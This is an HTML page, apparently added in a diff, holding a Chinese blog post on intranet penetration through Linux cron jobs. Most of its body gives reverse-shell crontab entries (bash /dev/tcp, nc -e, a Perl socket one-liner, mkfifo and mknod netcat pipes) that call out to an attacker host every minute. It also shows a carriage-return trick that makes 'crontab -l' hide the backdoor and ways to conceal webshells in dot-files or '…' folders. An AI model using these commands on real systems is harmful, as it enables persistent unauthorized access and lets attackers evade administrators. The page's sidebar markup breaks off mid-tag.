@@ -1,0 +1,868 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="内网渗透,计划任务," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="计划任务[TOC] 计划任务linux 计划任务 结合 NC执行后门 查看crontab执行情况查看其日志的方式1tail -f /var/log/cron crontab 命令1234567891011121314151617Usage: crontab [options] file crontab [options] crontab -n [hostname]Options: -u &amp;lt;u">
+<meta name="keywords" content="内网渗透,计划任务">
+<meta property="og:type" content="article">
+<meta property="og:title" content="计划任务">
+<meta property="og:url" content="http://yoursite.com/2019/07/11/内网渗透/计划任务/index.html">
+<meta property="og:site_name" content="吾善养浩然气">
+<meta property="og:description" content="计划任务[TOC] 计划任务linux 计划任务 结合 NC执行后门 查看crontab执行情况查看其日志的方式1tail -f /var/log/cron crontab 命令1234567891011121314151617Usage: crontab [options] file crontab [options] crontab -n [hostname]Options: -u &amp;lt;u">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://yoursite.com/2019/07/11/内网渗透/计划任务/15624920243890.jpg">
+<meta property="og:image" content="http://yoursite.com/2019/07/11/内网渗透/计划任务/15624937292291.jpg">
+<meta property="og:image" content="http://yoursite.com/2019/07/11/内网渗透/计划任务/15624942091590.jpg">
+<meta property="og:image" content="http://yoursite.com/2019/07/11/内网渗透/计划任务/15624986811057.jpg">
+<meta property="og:image" content="http://yoursite.com/2019/07/11/内网渗透/计划任务/15624989415170.jpg">
+<meta property="og:image" content="http://yoursite.com/2019/07/11/内网渗透/计划任务/15625034967756.jpg">
+<meta property="og:image" content="http://yoursite.com/2019/07/11/内网渗透/计划任务/15625035284231.jpg">
+<meta property="og:image" content="http://yoursite.com/2019/07/11/内网渗透/计划任务/15625045861245.jpg">
+<meta property="og:image" content="http://yoursite.com/2019/07/11/内网渗透/计划任务/15625054790101.jpg">
+<meta property="og:image" content="http://yoursite.com/2019/07/11/内网渗透/计划任务/15625062607262.jpg">
+<meta property="og:image" content="http://yoursite.com/2019/07/11/内网渗透/计划任务/15625069478372.jpg">
+<meta property="og:image" content="http://yoursite.com/2019/07/11/内网渗透/计划任务/15625077559555.jpg">
+<meta property="og:image" content="http://yoursite.com/2019/07/11/内网渗透/计划任务/15626424045783.jpg">
+<meta property="og:image" content="http://yoursite.com/2019/07/11/内网渗透/计划任务/15631095532134.jpg">
+<meta property="og:image" content="http://yoursite.com/2019/07/11/内网渗透/计划任务/15631095859841.jpg">
+<meta property="og:image" content="http://yoursite.com/2019/07/11/内网渗透/计划任务/15631099611608.jpg">
+<meta property="og:image" content="http://yoursite.com/2019/07/11/内网渗透/计划任务/15631105445990.jpg">
+<meta property="og:updated_time" content="2019-07-25T10:16:08.294Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="计划任务">
+<meta name="twitter:description" content="计划任务[TOC] 计划任务linux 计划任务 结合 NC执行后门 查看crontab执行情况查看其日志的方式1tail -f /var/log/cron crontab 命令1234567891011121314151617Usage: crontab [options] file crontab [options] crontab -n [hostname]Options: -u &amp;lt;u">
+<meta name="twitter:image" content="http://yoursite.com/2019/07/11/内网渗透/计划任务/15624920243890.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/07/11/内网渗透/计划任务/"/>
+
+
+
+
+
+  <title>计划任务 | 吾善养浩然气</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">吾善养浩然气</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-主页">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            主页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-关于">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-标签">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-分类">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-归档">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/11/内网渗透/计划任务/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="blackj liuyun">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="吾善养浩然气">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">计划任务</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-07-11T22:00:00+08:00">
+                2019-07-11
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/内网渗透/" itemprop="url" rel="index">
+                    <span itemprop="name">内网渗透</span>
+                  </a>
+                </span>
+
+                
+                
+                  ， 
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/内网渗透/计划任务/" itemprop="url" rel="index">
+                    <span itemprop="name">计划任务</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  1.6k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  6
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>计划任务<br>[TOC]</p>
+<h1 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h1><p>linux 计划任务 结合 NC执行后门</p>
+<h2 id="查看crontab执行情况"><a href="#查看crontab执行情况" class="headerlink" title="查看crontab执行情况"></a>查看crontab执行情况</h2><p>查看其日志的方式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tail -f /var/log/cron</span><br></pre></td></tr></table></figure></p>
+<h2 id="crontab-命令"><a href="#crontab-命令" class="headerlink" title="crontab 命令"></a>crontab 命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Usage:</span><br><span class="line"> crontab [options] file</span><br><span class="line"> crontab [options]</span><br><span class="line"> crontab -n [hostname]</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line"> -u &lt;user&gt;  define user</span><br><span class="line"> -e         edit user&apos;s crontab</span><br><span class="line"> -l         list user&apos;s crontab</span><br><span class="line"> -r         delete user&apos;s crontab</span><br><span class="line"> -i         prompt before deleting</span><br><span class="line"> -n &lt;host&gt;  set host in cluster to run users&apos; crontabs</span><br><span class="line"> -c         get host in cluster to run users&apos; crontabs</span><br><span class="line"> -s         selinux context</span><br><span class="line"> -x &lt;mask&gt;  enable debugging</span><br><span class="line"></span><br><span class="line">Default operation is replace, per 1003.2</span><br></pre></td></tr></table></figure>
+<h3 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[root@VM_0_2_centos ~]# cat /etc/crontab</span><br><span class="line">SHELL=/bin/bash</span><br><span class="line">PATH=/sbin:/bin:/usr/sbin:/usr/bin</span><br><span class="line">MAILTO=root</span><br><span class="line"></span><br><span class="line"># For details see man 4 crontabs</span><br><span class="line"></span><br><span class="line"># Example of job definition:</span><br><span class="line"># .---------------- minute (0 - 59)</span><br><span class="line"># |  .------------- hour (0 - 23)</span><br><span class="line"># |  |  .---------- day of month (1 - 31)</span><br><span class="line"># |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...</span><br><span class="line"># |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span><br><span class="line"># |  |  |  |  |</span><br><span class="line"># *  *  *  *  * user-name  command to be executed</span><br></pre></td></tr></table></figure>
+<p>配置文件为/etc/crontab<br>存放执行的crontab脚本文件的路径为/etc/cron.d<br>存放每个用户的crontab任务的目录在debian系统中一般为/var/spool/cron/crontabs，centos系统中一般为/var/spool/cron<br><img src="/2019/07/11/内网渗透/计划任务/15624920243890.jpg" alt="-w293"></p>
+<h2 id="利用crontab-反弹shell"><a href="#利用crontab-反弹shell" class="headerlink" title="利用crontab 反弹shell"></a>利用crontab 反弹shell</h2><p>常见的通过corntab反弹shell方法</p>
+<h3 id="bash-反弹shell"><a href="#bash-反弹shell" class="headerlink" title="bash 反弹shell"></a>bash 反弹shell</h3><p>测试设备<br>A：服务端 centos<br>B：客户端 ubuntu<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/xxx.xxx.xxx.xxx/xx 0&gt;&amp;1</span><br></pre></td></tr></table></figure></p>
+<h4 id="命令解析"><a href="#命令解析" class="headerlink" title="命令解析"></a>命令解析</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">参数	描述</span><br><span class="line">-c string	从string中读取命令并处理他们</span><br><span class="line">-r 	启动限制性shell,限制用户在默认目录下活动</span><br><span class="line">-i	启动交互性shell,允许用户输入</span><br><span class="line">-s	从标准输入读取命令</span><br></pre></td></tr></table></figure>
+<p>即启用交互式shell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">linux shell下常用的文件描述符是：</span><br><span class="line">1.  标准输入   (stdin) ：代码为 0 ，使用 &lt; 或 &lt;&lt; ； </span><br><span class="line">2.  标准输出   (stdout)：代码为 1 ，使用 &gt; 或 &gt;&gt; ； </span><br><span class="line">3.  标准错误输出(stderr)：代码为 2 ，使用 2&gt; 或 2&gt;&gt;</span><br></pre></td></tr></table></figure></p>
+<p>其中 “&gt;&amp;” 和 “&amp;&gt;”的效果一样都是将标准错误输出重定向到标准输出，即和”&gt; xxx 2&gt;&amp;1”是一样的。<br>这里的”&amp;”  类似于取地址符<br><img src="/2019/07/11/内网渗透/计划任务/15624937292291.jpg" alt="-w1435"><br>此处 客户端的输入和输出都在服务端上展示，服务端无法直接输入<br><img src="/2019/07/11/内网渗透/计划任务/15624942091590.jpg" alt="-w1438"></p>
+<p>在man bash 里面解释为<br><img src="/2019/07/11/内网渗透/计划任务/15624986811057.jpg" alt="-w709"><br>同理   “n&lt;&amp;word” 是word复制给n， “n&gt;&amp;word”是把word复制给n<br>“0&gt;&amp;1”就是把 0对应的设备改成的1对应的设备，那也就是socket。这就表明了 stdin就是从socket中读取数据，然后再执行命令，把bash的命令行返回内容通过stdout发到socket。<br><img src="/2019/07/11/内网渗透/计划任务/15624989415170.jpg" alt="-w712"></p>
+<p>/dev/tcp/是Linux中的一个特殊设备,打开这个文件就相当于发出了一个socket调用，建立一个socket连接，读写这个文件就相当于在这个socket连接中传输数据。同理，Linux中还存在/dev/udp/</p>
+<h3 id="crontab-反弹-shell"><a href="#crontab-反弹-shell" class="headerlink" title="crontab 反弹 shell"></a>crontab 反弹 shell</h3><h4 id="bash"><a href="#bash" class="headerlink" title="bash"></a>bash</h4><p>crontab -e<br>选择常见编辑器后，写入执行命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*/1 * * * * bash -i &amp;&gt; /dev/tcp/xxx.xxx.xxx.xxx/xx 0&gt;&amp;1</span><br><span class="line">*/1 * * * * bash -i &gt;&amp; /dev/tcp/xxx.xxx.xxx.xxx/xx 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<p>以及段师傅的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash -c &apos;/bin/bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&apos;</span><br></pre></td></tr></table></figure>
+<p>别忘了重启</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/cron restart</span><br></pre></td></tr></table></figure>
+<p>在ubuntu中 踩了个大坑，这条命令在centos中可以执行，但是在ubuntu中不行。<br>检查日志 “/var/log/syslog” 发现计划任务执行了，但是结果没建立连接<br><img src="/2019/07/11/内网渗透/计划任务/15625034967756.jpg" alt="-w888"><br><img src="/2019/07/11/内网渗透/计划任务/15625035284231.jpg" alt="-w887"></p>
+<p>修改下软连接<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -sf bash /bin/sh</span><br></pre></td></tr></table></figure></p>
+<p><img src="/2019/07/11/内网渗透/计划任务/15625045861245.jpg" alt="-w533"></p>
+<p><img src="/2019/07/11/内网渗透/计划任务/15625054790101.jpg" alt="-w530"><br><img src="/2019/07/11/内网渗透/计划任务/15625062607262.jpg" alt="-w1300"></p>
+<p>推测是原ubuntu 版本的bin/sh 软连接 连接到dash<br>修改后的软连接：<br><img src="/2019/07/11/内网渗透/计划任务/15625069478372.jpg" alt="-w653"><br>这里/bin/sh软连接是sh -&gt; dash 然后rbash -&gt; bash<br>关键问题是 bash和dash的区别</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">从Ubuntu 6.10开始，默认使用dash(theDebian Almquist Shell)而不是bash(the GNUBourne-Again Shell). 但Login Shell还是bash. 原因是dash更快、更高效，而且它符合POSIX规范。Ubuntu在启动的时候会运行很多shell脚本，使用dash可以加快启动速度</span><br></pre></td></tr></table></figure>
+<h4 id="bash和dash在-bin-sh-使用中的区别-待续"><a href="#bash和dash在-bin-sh-使用中的区别-待续" class="headerlink" title="bash和dash在/bin/sh  使用中的区别-待续"></a>bash和dash在/bin/sh  使用中的区别-待续</h4><p>将该ubuntu中的/bin/sh 软连接改回到dash，查看该问题报错</p>
+<h4 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h4><p>在centos下可以使用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*/1 * * * * nc -e /bin/sh ip port</span><br></pre></td></tr></table></figure>
+<p>别忘了重启<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service crond restart</span><br></pre></td></tr></table></figure></p>
+<p><img src="/2019/07/11/内网渗透/计划任务/15625077559555.jpg" alt="-w892"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*/1 * * * * perl -e &apos;use Socket;$i=&quot;vps.ip&quot;;$p=8989;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&apos;</span><br></pre></td></tr></table></figure>
+<h1 id="隐藏计划任务"><a href="#隐藏计划任务" class="headerlink" title="隐藏计划任务"></a>隐藏计划任务</h1><p>在使用计划任务入侵的时候，可以简单的隐藏下计划任务，以便于不那么容易被发现</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(crontab -l;printf &quot;*/1 * * * *  /usr/bin/nc ip 8550 -e /bin/sh;\rno crontab for `whoami`%100c\n&quot;)|crontab -</span><br></pre></td></tr></table></figure>
+<p>这个时候直接用crontab -l 输出的时候是直接显示no crontab for 当前用户。</p>
+<p>注意这里有一个坑点，osx系统中的nc 没有-e 参数（在Linux的大部分发行版中都默认编译了nc，但也许是出于安全考虑，发行版中默认编译的nc往往没有-e选项(没有define一个<br>GAPING_SECURITY_HOLE常量)，也就是说我们不能通过-e选项绑定目标的shell，使得我们在利用上受到限制，但这种情况下是不是就），这里可以看看mail文件”/var/mail/name”里面的报错<br><img src="/2019/07/11/内网渗透/计划任务/15626424045783.jpg" alt="-w657"></p>
+<h2 id="nc-缺少-e-参数的解决方式"><a href="#nc-缺少-e-参数的解决方式" class="headerlink" title="nc 缺少 -e 参数的解决方式"></a>nc 缺少 -e 参数的解决方式</h2><h3 id="dev-tcp"><a href="#dev-tcp" class="headerlink" title="dev/tcp"></a>dev/tcp</h3><p>在缺少 -e得时候，可以使用bash dev/tcp/ip/port（在有/dev/tcp的bash的前提下）<br><img src="/2019/07/11/内网渗透/计划任务/15631095532134.jpg" alt="-w563"></p>
+<p><img src="/2019/07/11/内网渗透/计划任务/15631095859841.jpg" alt="-w1112"></p>
+<h3 id="mknod-FIFO"><a href="#mknod-FIFO" class="headerlink" title="mknod FIFO"></a>mknod FIFO</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc ip port &gt;/tmp/f</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/07/11/内网渗透/计划任务/15631099611608.jpg" alt="-w1122"><br>mkfifo</p>
+<p>或者<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mknod /tmp/backpipe p ;/bin/sh 0&lt; /tmp/backpipe | nc ip 443 1&gt; /tmp/backpipe</span><br></pre></td></tr></table></figure></p>
+<p><img src="/2019/07/11/内网渗透/计划任务/15631105445990.jpg" alt="-w1136"></p>
+<h2 id="隐藏文件-文件夹"><a href="#隐藏文件-文件夹" class="headerlink" title="隐藏文件/文件夹"></a>隐藏文件/文件夹</h2><p>Linux/Unix 藏文件和文件夹<br>Linux/Unix 下想藏 Webshell 或者后门什么的，可以利用一下隐藏文件夹和文件。</p>
+<p>方法一<br>比如创建一个名字开头带 . 的 Webshell 或者文件夹，默认情况下是不会显示出来的，浏览器访问的时候加点访问就行。（查看方法：ls -a）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">touch .webshell.php 创建名字为 .webshell.php 的文件</span><br><span class="line">mkdir .backdoor/ 创建名字为 .backdoor 的文件夹</span><br></pre></td></tr></table></figure>
+<p>终极方法<br>在管理员喝多了或者脑子转不过来的情况下，是绝对不会发现的！至少我用了这么久是没几个发现的。<br>是文件的话浏览器访问直接输 … 就行，目录同理。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">touch … 创建名字为 … 的文件</span><br><span class="line">mkdir … 创建名字为 … 的文件夹</span><br></pre></td></tr></table></figure>
+<h2 id="隐藏"><a href="#隐藏" class="headerlink" title="隐藏"></a>隐藏</h2><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>  <a href="https://m3lon.github.io/2019/03/18/解决ubuntu-crontab反弹shell失败的问题/" target="_blank" rel="noopener">解决ubuntu-crontab反弹shell失败的问题</a></p>
+<p>   <a href="https://pen-testing.sans.org/blog/2013/05/06/netcat-without-e-no-problem/" target="_blank" rel="noopener">Netcat without -e? No Problem!</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/内网渗透/" rel="tag"># 内网渗透</a>
+          
+            <a href="/tags/计划任务/" rel="tag"># 计划任务</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/03/14/区块链/ETH/ETH-1/偷渡漏洞_拒绝服务/" rel="next" title="ETH 漏洞复现">
+                <i class="fa fa-chevron-left"></i> ETH 漏洞复现
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/07/18/Web渗透/漏洞学习/fastjson/" rel="prev" title="fastjson 1.2.47 rce">
+                fastjson 1.2.47 rce <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">blackj liuyun</p>
+              <p class="site-description motion-element" itemprop="description">纯净水@流云-自留地</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">12</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">12</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">16</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#计划任务"><span class="nav-number">1.</span> <span class="nav-text">计划任务</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#查看crontab执行情况"><span class="nav-number">1.1.</span> <span class="nav-text">查看crontab执行情况</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#crontab-命令"><span class="nav-number">1.2.</span> <span class="nav-text">crontab 命令</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#配置文件"><span class="nav-number">1.2.1.</span> <span class="nav-text">配置文件</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用crontab-反弹shell"><span class="nav-number">1.3.</span> <span class="nav-text">利用crontab 反弹shell</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#bash-反弹shell"><span class="nav-number">1.3.1.</span> <span class="nav-text">bash 反弹shell</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#命令解析"><span class="nav-number">1.3.1.1.</span> <span class="nav-text">命令解析</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#crontab-反弹-shell"><span class="nav-number">1.3.2.</span> <span class="nav-text">crontab 反弹 shell</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#bash"><span class="nav-number">1.3.2.1.</span> <span class="nav-text">bash</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#bash和dash在-bin-sh-使用中的区别-待续"><span class="nav-number">1.3.2.2.</span> <span class="nav-text">bash和dash在/bin/sh  使用中的区别-待续</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#nc"><span class="nav-number">1.3.2.3.</span> <span class="nav-text">nc</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#隐藏计划任务"><span class="nav-number">2.</span> <span class="nav-text">隐藏计划任务</span></a><ol class="nav-child"><li 